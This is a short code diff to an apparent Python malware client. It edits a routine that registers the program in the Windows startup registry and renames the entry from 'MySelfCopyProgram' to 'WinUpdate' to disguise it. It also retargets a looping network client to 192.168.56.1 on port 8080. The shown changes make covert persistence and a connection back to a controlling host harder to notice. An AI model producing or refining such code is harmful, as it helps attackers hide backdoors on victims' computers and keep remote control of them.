@@ -25,12 +25,12 @@ def add_to_startup(file_path):
         winreg.KEY_SET_VALUE
     )
 
-    winreg.SetValueEx(key, "MySelfCopyProgram", 0, winreg.REG_SZ, file_path)
+    winreg.SetValueEx(key, "WinUpdate", 0, winreg.REG_SZ, file_path)
     winreg.CloseKey(key)
 
 def client_program():
-    host = '192.168.56.101'
-    port = 5000
+    host = '192.168.56.1'
+    port = 8080
 
     while True:
         try:
